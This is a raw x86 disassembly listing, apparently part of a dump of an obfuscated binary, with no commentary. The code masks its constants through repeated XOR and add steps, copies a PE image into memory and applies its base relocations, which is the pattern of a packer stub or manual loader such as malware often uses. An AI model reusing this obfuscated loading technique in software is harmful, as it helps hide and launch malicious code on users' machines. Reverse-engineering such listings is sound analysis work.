  425166:	movsx  edx,BYTE PTR [edi+edx*1+0x3272f6]
  42516e:	xor    cl,0x7f
  425171:	add    cl,0x4
  425174:	movzx  ecx,cl
  425177:	cmp    edx,ecx
  425179:	jne    0x425193
  42517b:	mov    ecx,DWORD PTR [ebp-0x18]
  42517e:	xor    ecx,ebx
  425180:	lea    ecx,[ecx+edi*1+0x3272f6]
  425187:	xor    ecx,ebx
  425189:	cmp    ecx,0xf89c85bd
  42518f:	jne    0x425158
  425191:	jmp    0x42519a
  425193:	mov    eax,DWORD PTR [ebp-0x10]
  425196:	xor    eax,ebx
  425198:	add    eax,esi
  42519a:	mov    ecx,DWORD PTR [ebp-0x10]
  42519d:	xor    ecx,ebx
  42519f:	add    ecx,esi
  4251a1:	cmp    ecx,eax
  4251a3:	je     0x425319
  4251a9:	mov    eax,DWORD PTR [ebp-0x14]
  4251ac:	mov    eax,DWORD PTR [eax+0x8]
  4251af:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  4251b6:	mov    DWORD PTR [ebp-0x40],0xf89cc3d6
  4251bd:	mov    DWORD PTR [ebp-0x44],0xf89cb5a5
  4251c4:	mov    DWORD PTR [ebp-0x24],0xf89c85a1
  4251cb:	mov    DWORD PTR [ebp-0x20],eax
  4251ce:	mov    eax,DWORD PTR [ebp+0x8]
  4251d1:	mov    ecx,DWORD PTR [ebp-0x24]
  4251d4:	xor    ecx,ebx
  4251d6:	add    ecx,esi
  4251d8:	push   ecx
  4251d9:	mov    ecx,DWORD PTR [ebp-0x44]
  4251dc:	mov    eax,DWORD PTR [eax+0x1e0]
  4251e2:	xor    ecx,ebx
  4251e4:	add    ecx,esi
  4251e6:	push   ecx
  4251e7:	mov    ecx,DWORD PTR [ebp-0x40]
  4251ea:	xor    ecx,ebx
  4251ec:	add    ecx,esi
  4251ee:	push   ecx
  4251ef:	mov    ecx,DWORD PTR [ebp-0xc]
  4251f2:	xor    ecx,ebx
  4251f4:	add    ecx,esi
  4251f6:	push   ecx
  4251f7:	call   DWORD PTR [eax+0x14]
  4251fa:	mov    edi,eax
  4251fc:	mov    eax,DWORD PTR [ebp+0x8]
  4251ff:	mov    ecx,DWORD PTR [ebp-0x24]
  425202:	mov    eax,DWORD PTR [eax+0x1e0]
  425208:	xor    ecx,ebx
  42520a:	add    ecx,esi
  42520c:	push   ecx
  42520d:	mov    ecx,DWORD PTR [ebp-0x44]
  425210:	xor    ecx,ebx
  425212:	add    ecx,esi
  425214:	push   ecx
  425215:	mov    ecx,DWORD PTR [ebp-0xc]
  425218:	push   DWORD PTR [ebp-0x20]
  42521b:	xor    ecx,ebx
  42521d:	add    ecx,esi
  42521f:	push   ecx
  425220:	call   DWORD PTR [eax+0x14]
  425223:	mov    ecx,DWORD PTR [ebp-0xc]
  425226:	xor    ecx,ebx
  425228:	add    ecx,esi
  42522a:	mov    DWORD PTR [ebp-0x24],eax
  42522d:	cmp    ecx,edi
  42522f:	je     0x4255bc
  425235:	mov    ecx,DWORD PTR [ebp-0xc]
  425238:	xor    ecx,ebx
  42523a:	add    ecx,esi
  42523c:	cmp    ecx,eax
  42523e:	je     0x4255bc
  425244:	mov    DWORD PTR [ebp-0x40],0xf89c85a2
  42524b:	mov    DWORD PTR [ebp-0x54],0xf89c85a3
  425252:	mov    ecx,DWORD PTR [ebp-0x40]
  425255:	xor    cl,0xaf
  425258:	sub    cl,0xa
  42525b:	mov    BYTE PTR [edi],cl
  42525d:	mov    ecx,DWORD PTR [ebp-0xc]
  425260:	xor    cl,0xaf
  425263:	sub    cl,0xa
  425266:	mov    BYTE PTR [edi+0x1],cl
  425269:	mov    ecx,DWORD PTR [ebp-0x54]
  42526c:	xor    cl,0xaf
  42526f:	sub    cl,0xa
  425272:	mov    BYTE PTR [edi+0x2],cl
  425275:	and    DWORD PTR [ebp-0xc8],0x0
  42527c:	and    DWORD PTR [ebp-0xdc],0x0
  425283:	lea    ecx,[ebp-0xdc]
  425289:	push   ecx
  42528a:	push   DWORD PTR [ebp-0x20]
  42528d:	push   eax
  42528e:	lea    eax,[ebp-0xc8]
  425294:	push   eax
  425295:	mov    eax,DWORD PTR [ebp-0x14]
  425298:	push   DWORD PTR [eax+0xc]
  42529b:	mov    eax,DWORD PTR [ebp-0x2c]
  42529e:	add    eax,0x10
  4252a1:	push   eax
  4252a2:	push   edi
  4252a3:	call   0x424547
  4252a8:	mov    DWORD PTR [ebp-0x40],eax
  4252ab:	mov    eax,DWORD PTR [ebp+0x8]
  4252ae:	mov    ecx,DWORD PTR [ebp-0x50]
  4252b1:	mov    eax,DWORD PTR [eax+0x1e0]
  4252b7:	xor    ecx,ebx
  4252b9:	add    ecx,esi
  4252bb:	push   ecx
  4252bc:	mov    ecx,DWORD PTR [ebp-0xc]
  4252bf:	xor    ecx,ebx
  4252c1:	add    ecx,esi
  4252c3:	push   ecx
  4252c4:	push   edi
  4252c5:	call   DWORD PTR [eax+0x18]
  4252c8:	mov    eax,DWORD PTR [ebp-0x40]
  4252cb:	add    eax,0xffcd8d0a
  4252d0:	xor    eax,ebx
  4252d2:	cmp    eax,0xf89c85a5
  4252d7:	mov    eax,DWORD PTR [ebp+0x8]
  4252da:	mov    eax,DWORD PTR [eax+0x1e0]
  4252e0:	mov    ecx,DWORD PTR [ebp-0x50]
  4252e3:	jne    0x425306
  4252e5:	xor    ecx,ebx
  4252e7:	add    ecx,esi
  4252e9:	push   ecx
  4252ea:	mov    ecx,DWORD PTR [ebp-0xc]
  4252ed:	xor    ecx,ebx
  4252ef:	add    ecx,esi
  4252f1:	push   ecx
  4252f2:	push   DWORD PTR [ebp-0x2c]
  4252f5:	call   DWORD PTR [eax+0x18]
  4252f8:	mov    eax,DWORD PTR [ebp-0x24]
  4252fb:	mov    DWORD PTR [ebp-0x2c],eax
  4252fe:	mov    eax,DWORD PTR [ebp-0x20]
  425301:	mov    DWORD PTR [ebp-0x3c],eax
  425304:	jmp    0x425319
  425306:	xor    ecx,ebx
  425308:	add    ecx,esi
  42530a:	push   ecx
  42530b:	mov    ecx,DWORD PTR [ebp-0xc]
  42530e:	xor    ecx,ebx
  425310:	add    ecx,esi
  425312:	push   ecx
  425313:	push   DWORD PTR [ebp-0x24]
  425316:	call   DWORD PTR [eax+0x18]
  425319:	mov    eax,DWORD PTR [ebp-0x3c]
  42531c:	mov    DWORD PTR [ebp-0x34],eax
  42531f:	mov    eax,DWORD PTR [ebp-0x2c]
  425322:	mov    DWORD PTR [ebp-0x28],0xf89c85a5
  425329:	mov    DWORD PTR [ebp-0x40],eax
  42532c:	mov    edi,0xf89c85a4
  425331:	mov    DWORD PTR [ebp-0x30],edi
  425334:	mov    eax,DWORD PTR [ebp-0x28]
  425337:	xor    eax,ebx
  425339:	add    eax,esi
  42533b:	mov    DWORD PTR [ebp-0xc],eax
  42533e:	mov    eax,DWORD PTR [ebp-0x28]
  425341:	xor    eax,ebx
  425343:	add    eax,esi
  425345:	mov    DWORD PTR [ebp-0x14],eax
  425348:	mov    DWORD PTR [ebp-0x44],0xf89c8585
  42534f:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  425356:	mov    eax,DWORD PTR [ebp-0x28]
  425359:	mov    ecx,DWORD PTR [ebp-0x34]
  42535c:	xor    eax,ebx
  42535e:	add    eax,esi
  425360:	cmp    ecx,eax
  425362:	je     0x425558
  425368:	jmp    0x425534
  42536d:	mov    ecx,DWORD PTR [ebp-0xc]
  425370:	mov    eax,DWORD PTR [ebp-0x34]
  425373:	sub    eax,ecx
  425375:	mov    ecx,DWORD PTR [ebp-0x44]
  425378:	xor    ecx,ebx
  42537a:	add    ecx,esi
  42537c:	xor    edx,edx
  42537e:	div    ecx
  425380:	mov    DWORD PTR [ebp-0x14],eax
  425383:	mov    eax,DWORD PTR [ebp-0x24]
  425386:	mov    ecx,DWORD PTR [ebp-0x14]
  425389:	xor    eax,ebx
  42538b:	add    eax,esi
  42538d:	cmp    ecx,eax
  42538f:	jbe    0x42539b
  425391:	mov    eax,DWORD PTR [ebp-0x24]
  425394:	xor    eax,ebx
  425396:	add    eax,esi
  425398:	mov    DWORD PTR [ebp-0x14],eax
  42539b:	mov    eax,DWORD PTR [ebp-0x44]
  42539e:	mov    ecx,DWORD PTR [ebp-0x14]
  4253a1:	xor    eax,ebx
  4253a3:	add    eax,esi
  4253a5:	imul   eax,ecx
  4253a8:	mov    DWORD PTR [ebp-0x14],eax
  4253ab:	mov    eax,DWORD PTR [ebp-0x28]
  4253ae:	mov    ecx,DWORD PTR [ebp-0x14]
  4253b1:	xor    eax,ebx
  4253b3:	add    eax,esi
  4253b5:	cmp    ecx,eax
  4253b7:	je     0x425522
  4253bd:	mov    eax,DWORD PTR [ebp-0x14]
  4253c0:	mov    DWORD PTR [ebp-0x20],eax
  4253c3:	mov    eax,DWORD PTR [ebp-0xc]
  4253c6:	add    eax,DWORD PTR [ebp-0x40]
  4253c9:	mov    DWORD PTR [ebp-0x4c],0xf89c85a5
  4253d0:	mov    DWORD PTR [ebp-0x14],edi
  4253d3:	mov    DWORD PTR [ebp-0x54],0xf89c85a3
  4253da:	mov    DWORD PTR [ebp-0x1c],eax
  4253dd:	mov    DWORD PTR [ebp-0x38],0xf89c85a2
  4253e4:	mov    DWORD PTR [ebp-0x8],edi
  4253e7:	mov    eax,DWORD PTR [ebp-0x4c]
  4253ea:	xor    eax,ebx
  4253ec:	add    eax,esi
  4253ee:	jmp    0x4254e1
  4253f3:	mov    DWORD PTR [ebp-0xe4],0xf89c85ba
  4253fd:	mov    DWORD PTR [ebp-0xd0],0xf89c858f
  425407:	mov    eax,DWORD PTR [ebp-0x8]
  42540a:	mov    ecx,DWORD PTR [ebp-0x18]
  42540d:	xor    eax,ebx
  42540f:	add    eax,esi
  425411:	imul   eax,ecx
  425414:	mov    ecx,DWORD PTR [ebp-0x1c]
  425417:	mov    al,BYTE PTR [eax+ecx*1]
  42541a:	mov    BYTE PTR [ebp-0x1],al
  42541d:	mov    eax,DWORD PTR [ebp-0x8]
  425420:	mov    ecx,DWORD PTR [ebp-0x18]
  425423:	xor    eax,ebx
  425425:	add    eax,esi
  425427:	imul   eax,ecx
  42542a:	mov    ecx,DWORD PTR [ebp-0x54]
  42542d:	xor    ecx,ebx
  42542f:	add    eax,ecx
  425431:	mov    ecx,DWORD PTR [ebp-0x1c]
  425434:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  42543c:	mov    ecx,DWORD PTR [ebp-0xe4]
  425442:	xor    ecx,ebx
  425444:	lea    eax,[ecx+eax*1+0x3272f6]
  42544b:	movzx  ecx,BYTE PTR [ebp-0x1]
  42544f:	xor    ecx,eax
  425451:	mov    BYTE PTR [ebp-0x1],cl
  425454:	mov    al,BYTE PTR [ebp-0x1]
  425457:	mov    ecx,DWORD PTR [ebp-0x8]
  42545a:	mov    edx,DWORD PTR [ebp-0x18]
  42545d:	xor    ecx,ebx
  42545f:	add    ecx,esi
  425461:	imul   ecx,edx
  425464:	mov    edx,DWORD PTR [ebp-0x1c]
  425467:	mov    BYTE PTR [ecx+edx*1],al
  42546a:	mov    eax,DWORD PTR [ebp-0x8]
  42546d:	mov    ecx,DWORD PTR [ebp-0x18]
  425470:	xor    eax,ebx
  425472:	add    eax,esi
  425474:	imul   eax,ecx
  425477:	mov    ecx,DWORD PTR [ebp-0x1c]
  42547a:	mov    al,BYTE PTR [eax+ecx*1]
  42547d:	mov    BYTE PTR [ebp-0x1],al
  425480:	mov    eax,DWORD PTR [ebp-0x8]
  425483:	mov    ecx,DWORD PTR [ebp-0x18]
  425486:	xor    eax,ebx
  425488:	add    eax,esi
  42548a:	imul   eax,ecx
  42548d:	mov    ecx,DWORD PTR [ebp-0x14]
  425490:	xor    ecx,ebx
  425492:	add    eax,ecx
  425494:	mov    ecx,DWORD PTR [ebp-0x1c]
  425497:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  42549f:	mov    ecx,DWORD PTR [ebp-0xd0]
  4254a5:	xor    ecx,ebx
  4254a7:	lea    eax,[ecx+eax*1+0x3272f6]
  4254ae:	movzx  ecx,BYTE PTR [ebp-0x1]
  4254b2:	xor    ecx,eax
  4254b4:	mov    BYTE PTR [ebp-0x1],cl
  4254b7:	mov    al,BYTE PTR [ebp-0x1]
  4254ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4254bd:	mov    edx,DWORD PTR [ebp-0x18]
  4254c0:	xor    ecx,ebx
  4254c2:	add    ecx,esi
  4254c4:	imul   ecx,edx
  4254c7:	mov    edx,DWORD PTR [ebp-0x1c]
  4254ca:	mov    BYTE PTR [ecx+edx*1],al
  4254cd:	mov    eax,DWORD PTR [ebp-0x38]
  4254d0:	mov    ecx,DWORD PTR [ebp-0x14]
  4254d3:	xor    eax,ebx
  4254d5:	xor    ecx,ebx
  4254d7:	add    eax,esi
  4254d9:	add    ecx,esi
  4254db:	imul   eax,ecx
  4254de:	add    eax,DWORD PTR [ebp-0x18]
  4254e1:	mov    DWORD PTR [ebp-0x18],eax
  4254e4:	mov    eax,DWORD PTR [ebp-0x18]
  4254e7:	mov    ecx,DWORD PTR [ebp-0x20]
  4254ea:	cmp    ecx,eax
  4254ec:	jb     0x4253f3
  4254f2:	mov    eax,DWORD PTR [ebp-0x14]
  4254f5:	mov    ecx,DWORD PTR [ebp-0x20]
  4254f8:	xor    eax,ebx
  4254fa:	add    eax,esi
  4254fc:	imul   eax,ecx
  4254ff:	mov    ecx,DWORD PTR [ebp-0x4c]
  425502:	xor    ecx,ebx
  425504:	add    ecx,esi
  425506:	or     eax,ecx
  425508:	mov    ecx,DWORD PTR [ebp-0x30]
  42550b:	xor    ecx,ebx
  42550d:	add    eax,ecx
  42550f:	mov    ecx,DWORD PTR [ebp-0x30]
  425512:	xor    ecx,ebx
  425514:	add    eax,ecx
  425516:	mov    ecx,DWORD PTR [ebp-0xc]
  425519:	lea    eax,[eax+ecx*1+0x64e5ec]
  425520:	jmp    0x425531
  425522:	mov    eax,DWORD PTR [ebp-0x30]
  425525:	mov    ecx,DWORD PTR [ebp-0xc]
  425528:	xor    eax,ebx
  42552a:	lea    eax,[eax+ecx*1+0x3272f6]
  425531:	mov    DWORD PTR [ebp-0xc],eax
  425534:	mov    eax,DWORD PTR [ebp-0x30]
  425537:	xor    eax,ebx
  425539:	mov    ecx,0xffcd8d0a
  42553e:	sub    ecx,eax
  425540:	add    ecx,DWORD PTR [ebp-0x34]
  425543:	mov    eax,DWORD PTR [ebp-0x30]
  425546:	mov    edx,DWORD PTR [ebp-0xc]
  425549:	xor    eax,ebx
  42554b:	add    eax,esi
  42554d:	imul   eax,edx
  425550:	cmp    eax,ecx
  425552:	jbe    0x42536d
  425558:	push   DWORD PTR [ebp+0x8]
  42555b:	mov    eax,DWORD PTR [ebp+0x8]
  42555e:	push   DWORD PTR [eax+0x1cc]
  425564:	lea    eax,[ebp-0xd8]
  42556a:	push   eax
  42556b:	mov    eax,DWORD PTR [ebp+0x8]
  42556e:	mov    eax,DWORD PTR [eax+0x1c4]
  425574:	push   DWORD PTR [eax]
  425576:	mov    eax,DWORD PTR [ebp+0x8]
  425579:	mov    eax,DWORD PTR [eax+0x1c0]
  42557f:	push   DWORD PTR [eax]
  425581:	push   DWORD PTR [ebp-0x3c]
  425584:	push   DWORD PTR [ebp-0x2c]
  425587:	call   0x42601e
  42558c:	mov    DWORD PTR [ebp-0x40],eax
  42558f:	mov    eax,DWORD PTR [ebp-0x10]
  425592:	mov    ecx,DWORD PTR [ebp-0x2c]
  425595:	xor    eax,ebx
  425597:	add    eax,esi
  425599:	cmp    eax,ecx
  42559b:	je     0x4255bc
  42559d:	mov    eax,DWORD PTR [ebp+0x8]
  4255a0:	mov    ecx,DWORD PTR [ebp-0x50]
  4255a3:	mov    eax,DWORD PTR [eax+0x1e0]
  4255a9:	xor    ecx,ebx
  4255ab:	add    ecx,esi
  4255ad:	push   ecx
  4255ae:	mov    ecx,DWORD PTR [ebp-0x10]
  4255b1:	xor    ecx,ebx
  4255b3:	add    ecx,esi
  4255b5:	push   ecx
  4255b6:	push   DWORD PTR [ebp-0x2c]
  4255b9:	call   DWORD PTR [eax+0x18]
  4255bc:	pop    edi
  4255bd:	pop    esi
  4255be:	pop    ebx
  4255bf:	leave  
  4255c0:	ret    0x4
  4255c3:	push   ebp
  4255c4:	mov    ebp,esp
  4255c6:	push   ecx
  4255c7:	push   ecx
  4255c8:	lea    eax,[ebp-0x8]
  4255cb:	mov    DWORD PTR [ebp-0x4],eax
  4255ce:	push   esi
  4255cf:	mov    esi,DWORD PTR [ebp-0x4]
  4255d2:	mov    eax,0xf881ba2f
  4255d7:	mov    DWORD PTR [esi],eax
  4255d9:	mov    esi,DWORD PTR [ebp-0x8]
  4255dc:	cmp    esi,eax
  4255de:	pop    esi
  4255df:	jne    0x4255e9
  4255e1:	mov    BYTE PTR [ecx+0xa],0x83
  4255e5:	mov    BYTE PTR [edx+0x8],0x30
  4255e9:	mov    BYTE PTR [edx+0xa],0x83
  4255ed:	mov    BYTE PTR [ecx+0x2],0x15
  4255f1:	leave  
  4255f2:	ret    
  4255f3:	push   ebp
  4255f4:	mov    ebp,esp
  4255f6:	push   ecx
  4255f7:	push   ecx
  4255f8:	lea    eax,[ebp-0x8]
  4255fb:	mov    DWORD PTR [ebp-0x4],eax
  4255fe:	mov    edx,DWORD PTR [ebp-0x4]
  425601:	mov    eax,0xf88b0bcb
  425606:	mov    DWORD PTR [edx],eax
  425608:	mov    edx,DWORD PTR [ebp-0x8]
  42560b:	cmp    edx,eax
  42560d:	jne    0x42561e
  42560f:	mov    eax,DWORD PTR [ebp+0x8]
  425612:	mov    BYTE PTR [ecx+0x9],0xf
  425616:	mov    BYTE PTR [eax+0x7],0x58
  42561a:	mov    BYTE PTR [ecx+0x6],0x10
  42561e:	mov    BYTE PTR [ecx+0x3],0x1f
  425622:	leave  
  425623:	ret    0x4
  425626:	push   ebp
  425627:	mov    ebp,esp
  425629:	push   ecx
  42562a:	push   ecx
  42562b:	lea    eax,[ebp-0x8]
  42562e:	mov    DWORD PTR [ebp-0x4],eax
  425631:	mov    edx,DWORD PTR [ebp-0x4]
  425634:	mov    eax,0x7e0da2f
  425639:	mov    DWORD PTR [edx],eax
  42563b:	mov    edx,DWORD PTR [ebp-0x8]
  42563e:	cmp    edx,eax
  425640:	jne    0x425646
  425642:	mov    BYTE PTR [ecx+0x7],0x58
  425646:	mov    eax,DWORD PTR [ebp+0x8]
  425649:	mov    BYTE PTR [ecx+0x1],0x1a
  42564d:	mov    BYTE PTR [eax+0x9],0x2f
  425651:	leave  
  425652:	ret    0x4
  425655:	push   ebp
  425656:	mov    ebp,esp
  425658:	push   ecx
  425659:	push   ecx
  42565a:	lea    eax,[ebp-0x8]
  42565d:	mov    DWORD PTR [ebp-0x4],eax
  425660:	push   esi
  425661:	mov    esi,DWORD PTR [ebp-0x4]
  425664:	mov    eax,0x7060e3e
  425669:	mov    DWORD PTR [esi],eax
  42566b:	mov    esi,DWORD PTR [ebp-0x8]
  42566e:	cmp    esi,eax
  425670:	pop    esi
  425671:	jne    0x42567d
  425673:	mov    BYTE PTR [edx+0x4],0x14
  425677:	mov    WORD PTR [ecx+0x3],0x141f
  42567d:	mov    BYTE PTR [edx],0x40
  425680:	leave  
  425681:	ret    
  425682:	push   ebp
  425683:	mov    ebp,esp
  425685:	push   ecx
  425686:	push   ecx
  425687:	lea    eax,[ebp-0x8]
  42568a:	mov    DWORD PTR [ebp-0x4],eax
  42568d:	mov    edx,DWORD PTR [ebp-0x4]
  425690:	mov    eax,0xf8870b3f
  425695:	mov    DWORD PTR [edx],eax
  425697:	mov    edx,DWORD PTR [ebp-0x8]
  42569a:	cmp    edx,eax
  42569c:	jne    0x4256a9
  42569e:	mov    eax,DWORD PTR [ebp+0x8]
  4256a1:	mov    BYTE PTR [ecx+0x8],0x10
  4256a5:	mov    BYTE PTR [eax+0x1],0x1a
  4256a9:	mov    BYTE PTR [ecx+0x5],0xc
  4256ad:	leave  
  4256ae:	ret    0x4
  4256b1:	push   esi
  4256b2:	mov    ecx,edi
  4256b4:	call   0x425682
  4256b9:	mov    edx,edi
  4256bb:	mov    ecx,esi
  4256bd:	mov    BYTE PTR [esi],0x20
  4256c0:	call   0x425655
  4256c5:	push   esi
  4256c6:	mov    ecx,edi
  4256c8:	mov    BYTE PTR [esi+0x5],0xc
  4256cc:	call   0x425626
  4256d1:	push   esi
  4256d2:	mov    BYTE PTR [esi+0x6],0x10
  4256d6:	call   0x4255f3
  4256db:	mov    BYTE PTR [esi+0x2],0x15
  4256df:	mov    edx,esi
  4256e1:	jmp    0x4255c3
  4256e6:	push   ebp
  4256e7:	mov    ebp,esp
  4256e9:	push   ecx
  4256ea:	mov    ecx,DWORD PTR [edx+0x194]
  4256f0:	push   esi
  4256f1:	mov    esi,DWORD PTR [ebp+0x8]
  4256f4:	mov    esi,DWORD PTR [esi]
  4256f6:	mov    DWORD PTR [ecx],esi
  4256f8:	mov    ecx,DWORD PTR [edx+0x194]
  4256fe:	mov    ecx,DWORD PTR [ecx]
  425700:	mov    esi,DWORD PTR [edx+0x190]
  425706:	mov    DWORD PTR [esi],ecx
  425708:	mov    eax,DWORD PTR [edx+0x194]
  42570e:	mov    ecx,DWORD PTR [eax]
  425710:	mov    ecx,DWORD PTR [ecx+0x3c]
  425713:	add    ecx,DWORD PTR [eax]
  425715:	mov    DWORD PTR [ebp-0x4],0xf89ca5a5
  42571c:	mov    eax,DWORD PTR [ebp-0x4]
  42571f:	movzx  ecx,WORD PTR [ecx+0x16]
  425723:	xor    eax,0x75108af
  425728:	add    eax,0x3272f6
  42572d:	pop    esi
  42572e:	test   ecx,eax
  425730:	je     0x42573e
  425732:	mov    eax,DWORD PTR [edx+0x1c8]
  425738:	mov    DWORD PTR [eax],0xf89c85a4
  42573e:	leave  
  42573f:	ret    0x4
  425742:	push   ebp
  425743:	mov    ebp,esp
  425745:	sub    esp,0x70
  425748:	and    DWORD PTR [ebp-0x20],0x0
  42574c:	mov    DWORD PTR [ebp-0x18],0xf89cb5a5
  425753:	mov    DWORD PTR [ebp-0x1c],0xf89c85e5
  42575a:	mov    DWORD PTR [ebp-0x2c],0xf89c85a1
  425761:	mov    DWORD PTR [ebp-0x14],0xf89c85a3
  425768:	mov    DWORD PTR [ebp-0x2c],0xf89f05a5
  42576f:	mov    eax,DWORD PTR [ebp+0x20]
  425772:	mov    eax,DWORD PTR [eax+0x194]
  425778:	mov    DWORD PTR [ebp-0xc],eax
  42577b:	mov    eax,DWORD PTR [ebp+0x20]
  42577e:	push   ebx
  42577f:	push   esi
  425780:	mov    esi,DWORD PTR [eax+0x190]
  425786:	mov    eax,DWORD PTR [ebp+0x20]
  425789:	mov    eax,DWORD PTR [eax+0x18c]
  42578f:	mov    DWORD PTR [ebp-0x8],eax
  425792:	mov    eax,DWORD PTR [eax]
  425794:	push   edi
  425795:	mov    DWORD PTR [ebp-0x4],esi
  425798:	test   eax,eax
  42579a:	jne    0x4257a7
  42579c:	push   DWORD PTR [ebp+0x1c]
  42579f:	mov    edx,DWORD PTR [ebp+0x20]
  4257a2:	call   0x4256e6
  4257a7:	mov    eax,DWORD PTR [esi]
  4257a9:	mov    ebx,DWORD PTR [esi]
  4257ab:	add    ebx,DWORD PTR [eax+0x3c]
  4257ae:	mov    eax,DWORD PTR [ebp+0xc]
  4257b1:	mov    ecx,DWORD PTR [ebp-0x8]
  4257b4:	mov    ecx,DWORD PTR [ecx]
  4257b6:	mov    esi,0x75108af
  4257bb:	xor    eax,esi
  4257bd:	mov    edi,0x3272f6
  4257c2:	add    eax,edi
  4257c4:	cmp    eax,ecx
  4257c6:	jne    0x4259fe
  4257cc:	mov    eax,DWORD PTR [ebp-0xc]
  4257cf:	mov    eax,DWORD PTR [eax]
  4257d1:	mov    DWORD PTR [ebp-0x10],eax
  4257d4:	mov    eax,DWORD PTR [ebx+0x50]
  4257d7:	mov    DWORD PTR [ebp-0x68],eax
  4257da:	mov    eax,DWORD PTR [ebp-0x18]
  4257dd:	xor    eax,esi
  4257df:	add    eax,edi
  4257e1:	mov    DWORD PTR [ebp-0x64],eax
  4257e4:	mov    eax,DWORD PTR [ebp-0x14]
  4257e7:	and    DWORD PTR [ebp-0x6c],0x0
  4257eb:	xor    eax,esi
  4257ed:	add    eax,edi
  4257ef:	mov    DWORD PTR [ebp-0x60],eax
  4257f2:	lea    eax,[ebp-0x70]
  4257f5:	push   eax
  4257f6:	mov    eax,DWORD PTR [ebp+0x8]
  4257f9:	xor    eax,esi
  4257fb:	add    eax,edi
  4257fd:	push   eax
  4257fe:	mov    eax,DWORD PTR [ebp+0x20]
  425801:	add    eax,0xaa
  425806:	push   eax
  425807:	mov    eax,DWORD PTR [ebp+0x20]
  42580a:	mov    eax,DWORD PTR [eax+0x198]
  425810:	mov    DWORD PTR [ebp-0x70],0x4
  425817:	push   DWORD PTR [eax]
  425819:	mov    eax,DWORD PTR [ebp+0x10]
  42581c:	call   eax
  42581e:	mov    ecx,DWORD PTR [ebp-0xc]
  425821:	mov    ecx,DWORD PTR [ecx]
  425823:	mov    edx,DWORD PTR [ebp-0x8]
  425826:	mov    DWORD PTR [ebp-0x6c],eax
  425829:	mov    DWORD PTR [ebp+0x1c],eax
  42582c:	mov    DWORD PTR [edx],ecx
  42582e:	mov    ecx,DWORD PTR [ebp-0x4]
  425831:	mov    DWORD PTR [ecx],eax
  425833:	mov    eax,DWORD PTR [ebx+0x50]
  425836:	mov    DWORD PTR [ebp-0x68],eax
  425839:	mov    eax,DWORD PTR [ebp-0x1c]
  42583c:	xor    eax,esi
  42583e:	add    eax,edi
  425840:	mov    DWORD PTR [ebp-0x64],eax
  425843:	lea    eax,[ebp-0x20]
  425846:	mov    DWORD PTR [ebp-0x60],eax
  425849:	lea    eax,[ebp-0x70]
  42584c:	push   eax
  42584d:	mov    eax,DWORD PTR [ebp+0x8]
  425850:	xor    eax,esi
  425852:	add    eax,edi
  425854:	push   eax
  425855:	mov    eax,DWORD PTR [ebp+0x20]
  425858:	add    eax,0xee
  42585d:	push   eax
  42585e:	mov    eax,DWORD PTR [ebp+0x20]
  425861:	mov    eax,DWORD PTR [eax+0x198]
  425867:	mov    DWORD PTR [ebp-0x70],0x4
  42586e:	push   DWORD PTR [eax]
  425870:	mov    eax,DWORD PTR [ebp+0x10]
  425873:	call   eax
  425875:	test   eax,eax
  425877:	je     0x42589c
  425879:	and    DWORD PTR [ebp+0xc],0x0
  42587d:	cmp    DWORD PTR [ebx+0x50],0x0
  425881:	jbe    0x42589c
  425883:	mov    eax,DWORD PTR [ebp+0x1c]
  425886:	mov    ecx,DWORD PTR [ebp-0x10]
  425889:	sub    ecx,eax
  42588b:	mov    dl,BYTE PTR [ecx+eax*1]
  42588e:	inc    DWORD PTR [ebp+0xc]
  425891:	mov    BYTE PTR [eax],dl
  425893:	mov    edx,DWORD PTR [ebp+0xc]
  425896:	inc    eax
  425897:	cmp    edx,DWORD PTR [ebx+0x50]
  42589a:	jb     0x42588b
  42589c:	mov    edx,DWORD PTR [ebp+0x1c]
  42589f:	mov    ecx,DWORD PTR [edx+0x3c]
  4258a2:	add    ecx,edx
  4258a4:	mov    eax,DWORD PTR [ecx+0xa0]
  4258aa:	mov    ebx,DWORD PTR [ecx+0x28]
  4258ad:	add    eax,edx
  4258af:	sub    edx,DWORD PTR [ebp-0x10]
  4258b2:	add    ebx,DWORD PTR [ebp+0x1c]
  4258b5:	mov    DWORD PTR [ebp+0xc],edx
  4258b8:	mov    DWORD PTR [ebp-0x2c],ecx
  4258bb:	mov    DWORD PTR [ebp-0x14],ebx
  4258be:	mov    DWORD PTR [ebp-0x8],0x0
  4258c5:	jmp    0x425941
  4258c7:	add    edx,0xfffffff8
  4258ca:	shr    edx,1
  4258cc:	mov    DWORD PTR [ebp-0x18],edx
  4258cf:	je     0x42592d
  4258d1:	lea    edx,[eax+0x8]
  4258d4:	mov    DWORD PTR [ebp-0x4],edx
  4258d7:	mov    edx,DWORD PTR [ebp-0x18]
  4258da:	mov    DWORD PTR [ebp-0x18],edx
  4258dd:	mov    edx,DWORD PTR [ebp-0x4]
  4258e0:	movzx  edx,WORD PTR [edx]
  4258e3:	mov    DWORD PTR [ebp-0x24],edx
  4258e6:	and    edx,0xfff
  4258ec:	mov    DWORD PTR [ebp-0x28],edx
  4258ef:	mov    edx,DWORD PTR [ebp-0x24]
  4258f2:	shr    edx,0xc
  4258f5:	add    edx,0xffcd8d0a
  4258fb:	xor    edx,esi
  4258fd:	cmp    edx,0xf89c85a2
  425903:	jne    0x425924
  425905:	mov    edx,DWORD PTR [ebp-0x28]
  425908:	add    edx,DWORD PTR [ebp+0x1c]
  42590b:	mov    ebx,DWORD PTR [eax]
  42590d:	cmp    DWORD PTR [ebx+edx*1],0x0
  425911:	je     0x425921
  425913:	mov    ecx,DWORD PTR [ebp+0xc]
  425916:	add    ecx,DWORD PTR [ebx+edx*1]
  425919:	mov    ebx,DWORD PTR [eax]
  42591b:	mov    DWORD PTR [edx+ebx*1],ecx
  42591e:	mov    ecx,DWORD PTR [ebp-0x2c]
  425921:	mov    ebx,DWORD PTR [ebp-0x14]
  425924:	add    DWORD PTR [ebp-0x4],0x2
  425928:	dec    DWORD PTR [ebp-0x18]
  42592b:	jne    0x4258dd
  42592d:	mov    edx,DWORD PTR [ebp-0xc]
  425930:	add    DWORD PTR [ebp-0x8],edx
  425933:	mov    edx,DWORD PTR [ebp-0x8]
  425936:	cmp    edx,DWORD PTR [ecx+0xa4]
  42593c:	jae    0x42594f
  42593e:	add    eax,DWORD PTR [ebp-0xc]
  425941:	mov    edx,DWORD PTR [eax+0x4]
  425944:	mov    DWORD PTR [ebp-0xc],edx
